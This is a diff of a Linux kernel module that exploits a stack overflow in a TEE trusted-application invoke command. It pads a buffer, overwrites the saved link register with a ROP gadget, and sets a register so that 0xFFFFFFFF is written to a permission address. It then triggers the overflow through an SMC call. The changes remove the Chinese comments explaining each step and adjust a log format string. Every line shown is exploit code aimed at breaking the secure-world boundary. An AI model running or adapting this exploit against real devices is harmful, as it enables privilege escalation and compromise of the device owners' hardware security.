@@ -34,20 +34,16 @@ static int __init exp_init(void)
     payload = kzalloc(0x400, GFP_KERNEL);
     if (!payload) return -ENOMEM;
 
-    // 填充到偏移位置
     memset(payload, 0x41, LR_OFFSET);
 
-    // 覆盖 LR → ROP 写入权限
     *(uint64_t *)(payload + LR_OFFSET) = GADGET_SET_PERM;
-
-    // x0 将被设为 0xFFFFFFFF → 写入 PERM_ADDR
     *(uint64_t *)(payload + LR_OFFSET + 8) = 0xFFFFFFFF;
 
-    // 触发 TEE_InvokeTACommand 栈溢出
     pr_info("触发漏洞...");
     smc_tee_call(SMC_TEE_INVOKE_TA, __pa(payload), 0x380, 0);
 
-    pr_info("完成！0x%llx 应该已被设为 0xFFFFFFFF", PERM_ADDR);
+    pr_info("完成！0x%08x 应该已被设为 0xFFFFFFFF", PERM_ADDR);
+
     kfree(payload);
     return 0;
 }
